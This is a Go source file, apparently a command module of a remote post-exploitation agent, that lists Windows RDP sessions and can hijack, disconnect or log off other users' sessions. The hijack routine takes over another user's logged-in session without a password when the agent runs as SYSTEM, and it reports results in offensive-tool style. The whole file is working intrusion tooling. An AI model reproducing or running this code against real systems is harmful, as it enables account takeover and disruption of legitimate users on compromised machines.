//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	tsconWtsapi32        = windows.NewLazySystemDLL("wtsapi32.dll")
	tsconKernel32        = windows.NewLazySystemDLL("kernel32.dll")
	tsconEnumSessions    = tsconWtsapi32.NewProc("WTSEnumerateSessionsW")
	tsconQuerySessionInf = tsconWtsapi32.NewProc("WTSQuerySessionInformationW")
	tsconFreeMem         = tsconWtsapi32.NewProc("WTSFreeMemory")
	tsconConnectSession  = tsconWtsapi32.NewProc("WTSConnectSessionW")
	tsconDisconnectSess  = tsconWtsapi32.NewProc("WTSDisconnectSession")
	tsconLogoffSession   = tsconWtsapi32.NewProc("WTSLogoffSession")
	tsconPidToSessionId  = tsconKernel32.NewProc("ProcessIdToSessionId")
)

const (
	tsconServerHandle = 0
	tsconInfoUserName = 5
	tsconInfoDomain   = 7
	tsconStateActive  = 0
	tsconStateConn    = 1
	tsconStateConnQ   = 2
	tsconStateShadow  = 3
	tsconStateDisconn = 4
	tsconStateIdle    = 5
	tsconStateListen  = 6
	tsconStateReset   = 7
	tsconStateDown    = 8
	tsconStateInit    = 9
)

// TsconCommand manages RDP sessions — list, hijack, disconnect.
type TsconCommand struct{}

func (c *TsconCommand) Name() string { return "tscon" }
func (c *TsconCommand) Description() string {
	return "RDP session management — list, hijack, disconnect, logoff"
}

type tsconArgs struct {
	Action    string `json:"action"`     // list, hijack, disconnect
	SessionID int    `json:"session_id"` // target session ID
}

func (c *TsconCommand) Execute(task structs.Task) structs.CommandResult {
	var args tsconArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch args.Action {
	case "list":
		return tsconList()
	case "hijack":
		if args.SessionID < 0 {
			return errorResult("Error: -session_id required for hijack")
		}
		return tsconHijack(args.SessionID)
	case "disconnect":
		if args.SessionID < 0 {
			return errorResult("Error: -session_id required for disconnect")
		}
		return tsconDisconnect(args.SessionID)
	case "logoff":
		if args.SessionID < 0 {
			return errorResult("Error: -session_id required for logoff")
		}
		return tsconLogoff(args.SessionID)
	default:
		return errorf("Unknown action: %s. Use: list, hijack, disconnect, logoff", args.Action)
	}
}

func tsconList() structs.CommandResult {
	var sessionInfo uintptr
	var count uint32

	ret, _, err := tsconEnumSessions.Call(
		tsconServerHandle,
		0,
		1, // version
		uintptr(unsafe.Pointer(&sessionInfo)),
		uintptr(unsafe.Pointer(&count)),
	)
	if ret == 0 {
		return errorf("Error: WTSEnumerateSessions failed: %v", err)
	}
	defer tsconFreeMem.Call(sessionInfo)

	var sb strings.Builder
	sb.WriteString("=== RDP SESSIONS ===\n\n")
	sb.WriteString(fmt.Sprintf("%-6s %-20s %-15s %-20s %s\n", "ID", "Station", "State", "Username", "Domain"))
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	// WTS_SESSION_INFO on 64-bit: SessionId(4) + pad(4) + pWinStationName(8) + State(4) + pad(4) = 24 bytes
	entrySize := uintptr(24)

	for i := uint32(0); i < count; i++ {
		entry := sessionInfo + uintptr(i)*entrySize
		sessionID := *(*uint32)(unsafe.Pointer(entry))
		winStationPtr := *(*uintptr)(unsafe.Pointer(entry + 8))
		state := *(*uint32)(unsafe.Pointer(entry + 16))

		winStation := ""
		if winStationPtr != 0 {
			winStation = windows.UTF16PtrToString((*uint16)(unsafe.Pointer(winStationPtr)))
		}

		stateName := tsconStateName(state)
		username := tsconQueryInfo(sessionID, tsconInfoUserName)
		domain := tsconQueryInfo(sessionID, tsconInfoDomain)

		// Skip listener sessions with no user
		if username == "" && state == tsconStateListen {
			continue
		}

		sb.WriteString(fmt.Sprintf("%-6d %-20s %-15s %-20s %s\n",
			sessionID, winStation, stateName, username, domain))
	}

	// Get current session ID
	var currentSession uint32
	pid := windows.GetCurrentProcessId()
	tsconPidToSessionId.Call(uintptr(pid), uintptr(unsafe.Pointer(&currentSession)))
	sb.WriteString(fmt.Sprintf("\nCurrent session: %d\n", currentSession))

	return successResult(sb.String())
}

func tsconHijack(targetSession int) structs.CommandResult {
	var currentSession uint32
	pid := windows.GetCurrentProcessId()
	tsconPidToSessionId.Call(uintptr(pid), uintptr(unsafe.Pointer(&currentSession)))

	// WTSConnectSession: connect target session to current console (requires SYSTEM)
	ret, _, err := tsconConnectSession.Call(
		uintptr(targetSession),
		uintptr(currentSession),
		0, // password (empty — requires SYSTEM)
		0, // wait
	)

	if ret == 0 {
		return errorf("Error: WTSConnectSession failed (requires SYSTEM): %v", err)
	}

	username := tsconQueryInfo(uint32(targetSession), tsconInfoUserName)
	domain := tsconQueryInfo(uint32(targetSession), tsconInfoDomain)

	return successf("[+] Hijacked session %d (%s\\%s) → connected to session %d",
		targetSession, domain, username, currentSession)
}

func tsconDisconnect(sessionID int) structs.CommandResult {
	ret, _, err := tsconDisconnectSess.Call(
		tsconServerHandle,
		uintptr(sessionID),
		0, // wait = false
	)

	if ret == 0 {
		return errorf("Error: WTSDisconnectSession failed: %v", err)
	}

	return successf("[+] Disconnected session %d", sessionID)
}

func tsconLogoff(sessionID int) structs.CommandResult {
	username := tsconQueryInfo(uint32(sessionID), tsconInfoUserName)
	domain := tsconQueryInfo(uint32(sessionID), tsconInfoDomain)

	ret, _, err := tsconLogoffSession.Call(
		tsconServerHandle,
		uintptr(sessionID),
		0, // wait = false
	)

	if ret == 0 {
		return errorf("Error: WTSLogoffSession failed: %v", err)
	}

	msg := fmt.Sprintf("[+] Logged off session %d", sessionID)
	if username != "" {
		msg = fmt.Sprintf("[+] Logged off session %d (%s\\%s)", sessionID, domain, username)
	}

	return successResult(msg)
}

func tsconQueryInfo(sessionID uint32, infoClass uint32) string {
	var buffer uintptr
	var bytesReturned uint32

	ret, _, _ := tsconQuerySessionInf.Call(
		tsconServerHandle,
		uintptr(sessionID),
		uintptr(infoClass),
		uintptr(unsafe.Pointer(&buffer)),
		uintptr(unsafe.Pointer(&bytesReturned)),
	)
	if ret == 0 || buffer == 0 {
		return ""
	}
	defer tsconFreeMem.Call(buffer)

	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(buffer)))
}

func tsconStateName(state uint32) string {
	switch state {
	case tsconStateActive:
		return "Active"
	case tsconStateConn:
		return "Connected"
	case tsconStateConnQ:
		return "ConnectQuery"
	case tsconStateShadow:
		return "Shadow"
	case tsconStateDisconn:
		return "Disconnected"
	case tsconStateIdle:
		return "Idle"
	case tsconStateListen:
		return "Listen"
	case tsconStateReset:
		return "Reset"
	case tsconStateDown:
		return "Down"
	case tsconStateInit:
		return "Init"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}
